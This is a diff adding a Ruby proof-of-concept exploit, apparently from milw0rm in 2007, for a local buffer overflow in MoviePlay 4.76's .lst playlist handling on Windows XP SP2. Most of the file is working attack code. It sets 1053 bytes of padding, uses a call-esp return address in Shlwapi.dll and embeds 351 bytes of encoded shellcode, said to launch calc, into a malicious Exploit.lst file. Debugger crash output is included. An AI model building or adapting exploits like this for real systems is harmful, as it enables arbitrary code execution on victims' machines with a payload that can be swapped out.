@@ -1,0 +1,81 @@
+#!/usr/bin/env ruby
+###################
+#MoviePlay 4.76 .lst file Local buffer over-flow.
+#Credit to n00b for writing poc code..Pmsl
+#Tested on :Win xp sp2 eng.
+#Vendor web site: Netfarer.com MoviePlay 4.76
+#Buffer-over flow reported : Jan 02 2007 12:00AM
+#Credit goes to Parvez Anwar for finding the bug.
+#################################################################################
+#MoviePlay is prone to a remote buffer-overflow vulnerability because it
+#fails to properly bounds-check user-supplied input before copying it to
+#an insufficiently sized memory buffer. Exploiting this vulnerability
+#allows attackers to execute arbitrary machine code in the context of
+#the affected application..
+#I looked all over for a poc code or even some
+#thing to back the claim up nothing was found
+#And as i was board so i decided to write a poc for this.
+#1053byte's next 4 bytes over write eip then esp was pointing
+#4 bytes after no need for any nop sled or any-thing...
+#1053 bytes of buffer --> 4 bytes ret --> 351 shell-code --> 592 bytes of buffer.
+#File is 2000 byte's.
+#################################################################################
+# ..\\Debug info//..
+#(664.3b0): Access violation - code c0000005 (first chance)
+#First chance exceptions are reported before any exception handling.
+#This exception may be expected and handled.
+#eax=ffffffff ebx=00000000 ecx=41414141 edx=0048ef90 esi=00b00048 edi=00000001
+#eip=41414141 esp=0012ec78 ebp=41414141 iopl=0 nv up ei ng nz ac pe nc
+#cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010296
+#41414141 ?? ???
+#################################################################################
+#Shouts: - Str0ke - Marsu - SM - vade79 - c0ntex - Kevin Finisterre
+#################################################################################
+
+
+Header1 = "\x5b\x4d\x6f\x76\x69\x65\x50\x6c\x61\x79\x5d\x0d\x0a\x46\x69\x6c"+
+"\x65\x4e\x61\x6d\x65\x30\x3d\x43\x3a\x5c"
+
+bof1 = 'A'* 1053 #1053 bytes to our eip is over-writen
+
+ret = "\x45\x15\xF6\x77" # call esp in Shlwapi.dll 0x77F61545..
+#Calc shell-code.
+shell =
+"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"+ #351 bytes
+"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"+
+"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"+
+"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"+
+"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"+
+"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x54\x4e\x33\x4b\x38\x4e\x57"+
+"\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x41\x4b\x38"+
+"\x4f\x35\x42\x42\x41\x30\x4b\x4e\x49\x34\x4b\x58\x46\x33\x4b\x58"+
+"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"+
+"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"+
+"\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"+
+"\x4f\x35\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x54"+
+"\x4b\x58\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x4b\x38\x4e\x41\x4b\x38"+
+"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x53"+
+"\x42\x4c\x46\x46\x4b\x48\x42\x44\x42\x43\x45\x38\x42\x4c\x4a\x37"+
+"\x4e\x50\x4b\x48\x42\x44\x4e\x50\x4b\x48\x42\x57\x4e\x51\x4d\x4a"+
+"\x4b\x48\x4a\x46\x4a\x30\x4b\x4e\x49\x30\x4b\x58\x42\x58\x42\x4b"+
+"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x46\x4e\x43\x4f\x55\x41\x43"+
+"\x48\x4f\x42\x56\x48\x55\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x57"+
+"\x42\x55\x4a\x46\x4f\x4e\x50\x4c\x42\x4e\x42\x46\x4a\x36\x4a\x49"+
+"\x50\x4f\x4c\x48\x50\x30\x47\x35\x4f\x4f\x47\x4e\x43\x46\x41\x56"+
+"\x4e\x46\x43\x56\x50\x42\x45\x56\x4a\x37\x45\x36\x42\x30\x5a"
+
+bof2 = 'B'* 592 #592 fil the rest of the file to make it to 2000 bytes.
+
+Header2 = "\x2e\x6d"+
+"\x70\x33\x0d\x0a\x46\x69\x6c\x65\x4e\x61\x6d\x65\x31\x3d\x0d\x0a"+
+"\x4e\x75\x6d\x46\x69\x6c\x65\x73\x3d\x31\x0d\x0a"
+
+
+lst_file = Header1 + bof1 + ret + shell + bof2 + Header2
+File.open( "Exploit.lst","w") do |the_file| #Write file
+the_file.puts (lst_file)
+the_file.close
+print 'File was created success-fully..!!'
+end 
+
+# milw0rm.com [2007-06-08]
